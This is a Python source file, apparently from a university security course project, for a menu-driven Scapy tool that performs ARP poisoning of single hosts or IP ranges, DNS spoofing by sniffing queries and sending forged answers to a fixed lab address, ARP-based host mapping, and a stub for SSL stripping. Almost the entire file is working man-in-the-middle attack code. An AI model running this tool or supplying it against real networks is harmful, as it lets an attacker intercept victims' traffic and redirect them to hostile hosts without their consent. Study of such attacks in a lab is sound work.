import sys, os, argparse
from util import bcolors, clear, parse_ip_input, validate_domain
import random
from scapy.all import *
from scapy.all import sendp, Ether, IP, UDP, DNS, DNSQR, DNSRR, ARP, getmacbyip
import time
import threading


# The name of the network interface to use for sniffing and sending packets
interval = 4
# Set the interface to listen and respond on
net_interface = "enp0s8"
INTERFACE_NAME = "enp0s3"
ATTACKS = {
    "a": "ARP poisoning",
    "b": "DNS spoofing",
    "c": "SSL stripping",
    "d": "Address Mapping",
}

IP_ATTACKER = ""
MAC_ATTACKER = ""
IP_VICTIMS = []
MAC_VICTIMS = []


# Python 2.7... :(
try:
    input = raw_input
except NameError:
    pass


# Set up argument parser for using arguments in the command line
parser = argparse.ArgumentParser(
    prog="2IC80 tool",
    description="A tool for ARP poising, DNS spoofing and SSL stripping.",
    epilog="There are no arguments, please use the menu provided when running the tool. Good luck!",
)


def spoof(target_ip, spoof_ip):
    packet = ARP(pdst=target_ip, hwdst=getmacbyip(target_ip), psrc=spoof_ip)
    print(getmacbyip(target_ip))
    send(packet, verbose=False)


def ARPposioning():
    # IP_ATTACKER = input("Enter IP address of attacker: ")
    # MAC_ATTACKER = getmacbyip(IP_ATTACKER)

    victimNumber = input("Do you want to spoof one or multiple victims? (1/m)")
    if victimNumber == "1":
        ipVictim = input("Enter IP address of victim: ")
        # macVictim = getmacbyip(ipVictim)

        IP_VICTIMS.append(ipVictim)
        # MAC_VICTIMS.append(macVictim)

        ipToSpoof = input("Enter IP address to spoof: ")
        # print(ipVictim)
        spoof(ipVictim, ipToSpoof)

        print("\n\n")

    elif victimNumber == "m":
        IPrange = input("What is the range of IP addresses?")
        ipToSpoof = input("What is the IP address to spoof?")
        if "-" in IPrange:
            upperBoundary = IPrange.split("-")[1]
            lowerBoundary = lowerBoundary = IPrange.split(".")[3].split("-")[0]

            for i in range(int(lowerBoundary), int(upperBoundary)):
                ipVictim = (
                    IPrange.split(".")[0]
                    + "."
                    + IPrange.split(".")[1]
                    + "."
                    + IPrange.split(".")[2]
                    + "."
                    + str(i)
                )
                # macVictim = getmacbyip(ipVictim)

                IP_VICTIMS.append(ipVictim)
                # MAC_VICTIMS.append(macVictim)
                spoof(ipVictim, ipToSpoof)
                print(ipVictim)

        else:
            print("Invalid input. Please try again.")

        print("\n\n")

    print(
        "{cyan}{attack}{endc} has been executed (packet has been succesfully sent)\n".format(
            cyan=bcolors.OKCYAN, attack=ATTACKS["a"], endc=bcolors.ENDC
        )
    )


def DNSpoisoning():
    dns_ip = ""
    dns_domain = ""

    # DNS poisoning requires impersonating the router

    # Ask for a domain until a valid one is provided
    while not dns_domain:
        dns_domain_input = input("Enter the domain name to spoof: ")
        dns_domain_valid = validate_domain(dns_domain_input)

        if dns_domain_valid:
            dns_domain = dns_domain_input
        else:
            print(
                "{warning}Please enter a valid domain (format: www.example.com){endc}".format(
                    warning=bcolors.WARNING, endc=bcolors.ENDC
                )
            )

    # Ask for an IP address until a valid one is provided

    # Assumption: ARP poisoning has been applied to make the victim think the attacker is the router (where the DNS lookup message will be sent)
    # The data below is assumed from that ARP poisoning attack
    # Sniff for a DNS query matching the 'packet_filter' and send a specially crafted reply
    sniff(filter="udp port 53", prn=dns_reply, store=0, iface=net_interface, count=1)

    print(
        "\n{cyan}{attack}{endc} has been executed (sent a packet to victim resolving {cyan}{domain}{endc} to {cyan}{ip}{endc})\n".format(
            cyan=bcolors.OKCYAN,
            attack=ATTACKS["b"],
            endc=bcolors.ENDC,
            domain=dns_domain,
            ip=dns_ip,
        )
    )


def dns_reply(packet):
    # Construct the DNS packet
    # Construct the Ethernet header by looking at the sniffed packet
    eth = Ether(src=packet[Ether].dst, dst=packet[Ether].src)

    # Construct the IP header by looking at the sniffed packet
    ip = IP(src=packet[IP].dst, dst=packet[IP].src)

    # Construct the UDP header by looking at the sniffed packet
    udp = UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)

    # Construct the DNS response by looking at the sniffed packet and manually
    dns = DNS(
        id=packet[DNS].id,
        qd=packet[DNS].qd,
        aa=1,
        rd=0,
        qr=1,
        qdcount=1,
        ancount=1,
        nscount=0,
        arcount=0,
        ar=DNSRR(
            rrname=packet[DNS].qd.qname, type="A", ttl=600, rdata="192.168.56.102"
        ),
    )

    # Put the full packet together
    response_packet = eth / ip / udp / dns

    # Send the DNS response
    sendp(response_packet, iface=net_interface)


def SSLstripping():
    print("SSL stripping selected.\n")


def mapAddresses():
    answer = raw_input(
        "Hello , do you want to map a specific ip address of a device on the network to their corresponding MAC addresse? Or Do you want to map all the devices on the network to their corresponding MAC addresses? (1/2)  \n"
    )

    if answer == "2":
        print(
            "we shall now map the ip addresses of each device on the network to their corresponding MAC addresses: \n"
        )
        print(arping("192.168.56.0-255"))
    elif answer == "1":
        address = raw_input(
            "Please enter the IP address of the device you want to map to its corresponding MAC address: \n"
        )
        print(arping(address))


def main():
    clear()
    print("2IC80: Tool by G44")
    while True:
        print("Select the preferred attack from the list below:\n")

        print(
            "    {cyan}a{endc}) {attack}".format(
                cyan=bcolors.OKCYAN, attack=ATTACKS["a"], endc=bcolors.ENDC
            )
        )
        print(
            "    {cyan}b{endc}) {attack}".format(
                cyan=bcolors.OKCYAN, attack=ATTACKS["b"], endc=bcolors.ENDC
            )
        )
        print(
            "    {cyan}c{endc}) {attack}".format(
                cyan=bcolors.OKCYAN, attack=ATTACKS["c"], endc=bcolors.ENDC
            )
        )
        print(
            "    {cyan}d{endc}) {attack}".format(
                cyan=bcolors.OKCYAN, attack=ATTACKS["d"], endc=bcolors.ENDC
            )
        )
        print(
            "    {cyan}e{endc}) Exit\n".format(cyan=bcolors.OKCYAN, endc=bcolors.ENDC)
        )

        choice = input("\nYour choice: " + bcolors.OKCYAN)
        print(bcolors.ENDC + "\n")
        selectedName = choice
        if choice in ATTACKS:
            selectedName = ATTACKS[choice]
        elif choice == "e":
            selectedName = "Exit"
        print(
            "You have selected {cyan}{name}{endc}. \n".format(
                cyan=bcolors.OKCYAN, name=selectedName, endc=bcolors.ENDC
            )
        )

        if choice == "e":
            break
        elif choice == "a":
            ARPposioning()
        elif choice == "b":
            DNSpoisoning()
        elif choice == "c":
            SSLstripping()
        elif choice == "d":
            mapAddresses()
        else:
            print("Invalid input. Please try again.\n")


# Entry point: This part runs when the tool is called from the command line using `python tool.py`. The if-statement is not required, but good practice.
if __name__ == "__main__":
    parser.parse_args()
    main()
